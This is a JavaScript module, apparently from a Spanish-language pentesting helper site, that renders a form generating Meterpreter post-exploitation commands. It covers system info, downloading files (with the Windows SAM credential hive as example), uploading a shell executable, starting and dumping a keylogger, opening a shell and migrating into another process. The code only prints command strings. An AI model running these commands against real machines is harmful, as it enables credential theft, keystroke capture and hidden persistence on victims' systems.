const meterpreterModule = {
    html: `
        <h2>Meterpreter - Generador de Comandos</h2>
        <p>Genera comandos para la shell interactiva de Meterpreter.</p>

        <div class="form-section">
            <h3>Información del Sistema</h3>
            <button onclick="meterpreterModule.generateSysinfo()">Obtener Info (sysinfo)</button>
            <button onclick="meterpreterModule.generateGetuid()">Obtener Usuario (getuid)</button>
        </div>

        <div class="form-section">
            <h3>Acceso a Archivos</h3>
            <label for="downloadFile">Archivo a Descargar:</label>
            <input type="text" id="downloadFile" placeholder="Ej: C:\\Windows\\System32\\config\\SAM">
            <button onclick="meterpreterModule.generateDownload()">Descargar</button>
            
            <br><br>
            
            <label for="uploadLocalFile">Archivo Local a Subir:</label>
            <input type="text" id="uploadLocalFile" placeholder="Ej: /root/shell.exe">
            <label for="uploadRemotePath">Ruta Remota:</label>
            <input type="text" id="uploadRemotePath" placeholder="Ej: C:\\Users\\Public\\">
            <button onclick="meterpreterModule.generateUpload()">Subir</button>
        </div>
        
        <div class="form-section">
            <h3>Keylogger y Shell</h3>
            <button onclick="meterpreterModule.generateKeyscanStart()">Iniciar Keylogger</button>
            <button onclick="meterpreterModule.generateKeyscanDump()">Volcar Keylogger</button>
            <button onclick="meterpreterModule.generateShell()">Obtener Shell</button>
        </div>
        
        <div class="form-section">
            <h3>Migración de Procesos</h3>
            <label for="processId">ID del Proceso a Migrar:</label>
            <input type="text" id="processId" placeholder="Ej: 1234">
            <button onclick="meterpreterModule.generateMigrate()">Migrar Proceso</button>
        </div>

        <div class="command-box">
            <h4>Comando generado:</h4>
            <p id="outputCommand">meterpreter</p>
        </div>
    `,
    
    // Funciones para generar los comandos
    generateSysinfo: () => {
        document.getElementById('outputCommand').textContent = 'sysinfo';
    },

    generateGetuid: () => {
        document.getElementById('outputCommand').textContent = 'getuid';
    },
    
    generateDownload: () => {
        const downloadFile = document.getElementById('downloadFile').value.trim();
        if (!downloadFile) {
            alert("Debes especificar el archivo a descargar.");
            return;
        }
        document.getElementById('outputCommand').textContent = `download "${downloadFile}"`;
    },

    generateUpload: () => {
        const uploadLocalFile = document.getElementById('uploadLocalFile').value.trim();
        const uploadRemotePath = document.getElementById('uploadRemotePath').value.trim();
        if (!uploadLocalFile || !uploadRemotePath) {
            alert("Debes especificar el archivo local y la ruta remota.");
            return;
        }
        document.getElementById('outputCommand').textContent = `upload "${uploadLocalFile}" "${uploadRemotePath}"`;
    },

    generateKeyscanStart: () => {
        document.getElementById('outputCommand').textContent = 'keyscan_start';
    },

    generateKeyscanDump: () => {
        document.getElementById('outputCommand').textContent = 'keyscan_dump';
    },

    generateShell: () => {
        document.getElementById('outputCommand').textContent = 'shell';
    },
    
    generateMigrate: () => {
        const processId = document.getElementById('processId').value.trim();
        if (!processId) {
            alert("Debes especificar el ID del proceso.");
            return;
        }
        document.getElementById('outputCommand').textContent = `migrate ${processId}`;
    },
};

// Se registra la herramienta en el objeto global
toolForms.meterpreter = meterpreterModule;